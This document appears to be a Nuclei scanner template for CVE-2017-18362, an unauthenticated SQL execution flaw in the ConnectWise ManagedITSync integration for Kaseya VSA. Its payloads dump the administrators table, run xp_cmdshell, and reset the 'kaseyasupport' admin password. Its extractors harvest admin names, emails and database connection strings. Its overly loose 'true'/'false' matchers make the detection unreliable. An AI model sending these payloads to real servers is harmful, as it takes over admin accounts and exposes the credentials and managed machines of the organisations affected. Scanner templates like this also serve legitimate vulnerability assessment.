id: cve-2017-18362

info:
  name: ConnectWise ManagedITSync - Unauthenticated SQL Injection
  author: six
  severity: critical
  description: |
    ConnectWise ManagedITSync integration through 2017 for Kaseya VSA contains an unauthenticated remote command execution caused by accessible ManagedIT.asmx page, letting attackers run arbitrary SQL queries without authentication, exploit requires access to the web interface.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2017-18362
    - https://github.com/kbni/owlky
    - https://docs.connectwise.com/ConnectWise_Documentation/140/Kaseya_-_IP_and_Domain_Restrictions
  classification:
    cvss-score: 9.8
    cve-id: CVE-2017-18362
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 25
    vendor: connectwise
    product: manageditsync
  tags: cve,connectwise,manageditsync,sqli,rce,critical

variables:
  marker: "{{rand_text_alpha(8)}}"
  resetpass: "{{rand_text_alpha(8)}}"
  hashpass: "deadbeefdefec8eddeaddeadd00d2badfdfdfdfdfee1deadfeedfaceb16b00b5"

http:
  - method: GET
    path:
      - "{{BaseURL}}/KaseyaCwWebService/ManagedIT.asmx"
    headers:
      User-Agent: "{{UserAgent}}"
      Accept: "*/*"
    extractors:
      - type: regex
        part: body
        regex:
          - "(ManagedIT.asmx\\?op=[^\"'\\s]+)"

  - method: POST
    path:
      - "{{BaseURL}}/KaseyaCwWebService/ManagedIT.asmx/GetDataSet"
      - "{{BaseURL}}/KaseyaCwWebService/ManagedIT.asmx/GetConnectionString"
      - "{{BaseURL}}/KaseyaCwWebService/ManagedIT.asmx/GetAllMachineIDs"
      - "{{BaseURL}}/KaseyaCwWebService/ManagedIT.asmx/ExecuteSQL"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "{{UserAgent}}"
      Accept: "*/*"
    body: |
      sql={{payload}}

    payloads:
      payload:
        - "SELECT * FROM administrators"
        - "SELECT '{{marker}}' AS test"
        - "SELECT DB_NAME()"
        - "SELECT SYSTEM_USER"
        - "SELECT @@VERSION"
        - "UPDATE administrators SET forceNewPassword=0,disableUntil='1980-01-01 00:00:00.000',adminType=2,adminPassword='cover{{hashpass}}' WHERE adminName='kaseyasupport'"
        - "EXEC xp_cmdshell 'dir C:\\\\'"

    matchers-condition: and
    matchers:
      - type: status
        status: [200]

      - type: word
        part: body
        words:
          - "<NewDataSet>"
          - "<string"
          - "</string>"
        condition: or

      - type: word
        part: body
        words:
          - "<Table"
          - "adminName"
          - "adminPassword"
          - "logonEmailAddr"

          - "<output"
          - "</output>"
          - "Directory of C:"
          - "Volume in drive C"

          - "Server="
          - "Database="
          - "Data Source="
          - "Initial Catalog="
          - "Integrated Security="
          - "User ID="
          - "Password="
          - "Provider="
          - "Trusted_Connection="

          - "<Bytes>"
          - "</Bytes>"
          - "<groupName>"
          - "</groupName>"
          - "<machineID>"
          - "<orgRef>"

          - "true"
          - "false"
          - "<boolean>true</boolean>"
          - "<boolean>false</boolean>"

          - "Microsoft SQL Server"
          - "{{marker}}"
          - "SYSTEM_USER"
          - "DB_NAME"

          - "SQL Server blocked access to procedure 'sys.xp_cmdshell'"
          - "Could not find stored procedure 'xp_cmdshell'"
          - "Login failed"
          - "Cannot connect to"
          - "Invalid object name"
        condition: or

      - type: dsl
        dsl:
          - 'contains(body,"{{marker}}") || contains(body,"adminName") || contains(body,"Server=db") || contains(body,"Microsoft SQL Server")'

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - "<Table[^>]*>(.+?)</Table>"
          - "<adminName>([^<]+)</adminName>"
          - "<logonEmailAddr>([^<]+)</logonEmailAddr>"

      - type: regex
        part: body
        group: 1
        regex:
          - "(Server=[^;]+;[^<]*)"
          - "<string[^>]*>([^<]+)</string>"

      - type: regex
        part: body
        group: 1
        regex:
          - "(Microsoft SQL Server [0-9.]+ [^<]+)"
          - "(<Error>.*?</Error>)"

      - type: regex
        part: body
        group: 1
        regex:
          - "<groupName>([^<]+)</groupName>"
          - "<Bytes>([^<]+)</Bytes>"

      - type: regex
        part: body
        group: 1
        regex:
          - "<boolean>([^<]+)</boolean>"
          - "(true|false)"

    stop-at-first-match: true
